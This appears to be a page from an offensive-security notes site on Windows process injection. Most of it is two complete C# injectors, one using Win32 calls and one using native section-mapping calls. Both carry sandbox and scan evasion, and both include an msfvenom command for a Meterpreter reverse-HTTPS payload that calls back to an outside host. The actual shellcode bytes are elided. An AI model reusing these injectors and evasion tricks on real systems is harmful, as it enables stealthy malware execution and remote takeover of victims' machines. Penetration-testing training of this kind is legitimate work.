---
description: Inject shellcode into remote process's virtual address space
---

# Process Injectors

* [https://rastamouse.me/exploring-process-injection-opsec-part-1/](https://rastamouse.me/exploring-process-injection-opsec-part-1/)
* [https://rastamouse.me/exploring-process-injection-opsec-part-2/](https://rastamouse.me/exploring-process-injection-opsec-part-2/)
* [https://www.x86matthew.com/view_post?id=proc_env_injection](https://www.x86matthew.com/view_post?id=proc_env_injection)




## Classic Process Injection



### C\# DLL via Win32 API

* [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Program.cs)

Using standard *Win32 API* trio:

* [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
* [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
* [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

{% code title="ProcessInjector.cs" %}
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjector
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public static void Run()
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }

            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                return;
            }

            Process[] pList = Process.GetProcessesByName("explorer");
            if (pList.Length == 0)
            {
                // Console.WriteLine("[-] No such process!");
                System.Environment.Exit(1);
            }
            int processId = pList[0].Id;
            // 0x001F0FFF = PROCESS_ALL_ACCESS
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
            byte[] buf = new byte[???] {
            0x31,0x33,...,0x33,0x37 };

            // XOR-decrypt the shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'a');
            }

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```
{% endcode %}

{% hint style="info" %}
When selecting architecture during compilation, remember that there're 4 potential ways to perform the migration:

1. 64-bit > 64-bit: succeeds.
2. 64-bit > 32-bit: succeeds.
3. 32-bit > 32-bit: succeeds.
4. 32-bit > 64-bit: fails due to `CreateRemoteThread` does not natively support it.
{% endhint %}



### C\# Executable via Native API

* [https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection)
* [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Sections%20Shellcode%20Process%20Injector/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Sections%20Shellcode%20Process%20Injector/Program.cs)

Using *Native API* quadro:

* NtCreateSection
* NtMapViewOfSection
* RtlCreateUserThread
* NtUnmapViewOfSection

{% code title="NtProcessInjector.cs" %}
```csharp
using System;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NtProcessInjector
{
    public class Program
    {
        public const uint PROCESS_ALL_ACCESS     = 0x001F0FFF;
        public const uint SECTION_MAP_READ       = 0x0004;
        public const uint SECTION_MAP_WRITE      = 0x0002;
        public const uint SECTION_MAP_EXECUTE    = 0x0008;
        public const uint PAGE_READ_WRITE        = 0x04;
        public const uint PAGE_READ_EXECUTE      = 0x20;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint SEC_COMMIT             = 0x8000000;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        // BEGIN DEBUG (imports)
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        static extern int memcmp(byte[] b1, byte[] b2, UIntPtr count);

        static bool CompareByteArray(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, (UIntPtr)b1.Length) == 0;
        }
        // END DEBUG

        static void Main(string[] args)
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }

            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
            byte[] buf = new byte[???] {
            0x31,0x33,...,0x33,0x37 };

            // XOR-decrypt the shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'a');
            }

            int bufLength = buf.Length;
            UInt32 uBufLength = (UInt32)bufLength;

            // Get handle on a local process
            IntPtr hLocalProcess = Process.GetCurrentProcess().Handle;

            // Get handle on a remote process (by name)
            string processName = args[0];
            Process[] pList = Process.GetProcessesByName(processName);
            if (pList.Length == 0)
            {
                Console.WriteLine("[-] No such process");
                return;
            }
            int processId = pList.First().Id;
            IntPtr hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
            if (hRemoteProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open remote process");
                return;
            }

            // Create RWX memory section for the shellcode
            IntPtr hSection = new IntPtr();
            if (NtCreateSection(ref hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref uBufLength, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero) != 0)
            {
                Console.WriteLine("[-] Falied to create a section for the shellcode");
                return;
            }

            // Map the view of created section into the LOCAL process's virtual address space (as R-W)
            IntPtr baseAddressL = new IntPtr();
            ulong sectionOffsetL = new ulong();
            if (NtMapViewOfSection(hSection, hLocalProcess, ref baseAddressL, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetL, out uBufLength, 2, 0, PAGE_READ_WRITE) != 0)
            {
                Console.WriteLine("[-] Falied to map the view into local process's space");
                return;
            }
            
            // Map the view of (the same) created section into the REMOTE process's virtual address space (as R-E)
            IntPtr baseAddressR = new IntPtr();
            ulong sectionOffsetR = new ulong();
            if (NtMapViewOfSection(hSection, hRemoteProcess, ref baseAddressR, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetR, out uBufLength, 2, 0, PAGE_READ_EXECUTE) != 0)
            {
                Console.WriteLine("[-] Falied to map the view into remote process's space");
                return;
            }

            // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
            Marshal.Copy(buf, 0, baseAddressL, bufLength);

            // BEGIN DEBUG (check if the shellcode was copied correctly)
            byte[] remoteMemory = new byte[bufLength];
            IntPtr bytesRead = new IntPtr();
            ReadProcessMemory(hRemoteProcess, baseAddressR, remoteMemory, remoteMemory.Length, out bytesRead);
            if (!CompareByteArray(buf, remoteMemory))
            {
                Console.WriteLine("[-] DEBUG: Shellcode bytes read from remotely mapped view do not match with local buf");
                return;
            }
            // END DEBUG

            // Execute the shellcode in a remote thread (also can be done with CreateRemoteThread)
            //CreateRemoteThread(hRemoteProcess, IntPtr.Zero, 0, baseAddressR, IntPtr.Zero, 0, IntPtr.Zero)
            IntPtr threadHandle = new IntPtr();
            if (RtlCreateUserThread(hRemoteProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, baseAddressR, IntPtr.Zero, ref threadHandle, IntPtr.Zero) != IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create a remote thread");
                return;
            }

            Console.WriteLine($"[+] Successfully injected shellcode into remote process ({processName}, {processId})");

            // Clean up
            NtUnmapViewOfSection(hLocalProcess, baseAddressL);
            NtClose(hSection);
        }
    }
}
```
{% endcode %}




## Tools



### PSInject
- [https://github.com/EmpireProject/PSInject](https://github.com/EmpireProject/PSInject)

```
PS > Invoke-PSInject -ProcId <PID> -PoshCode <BASE64_CMD>
```
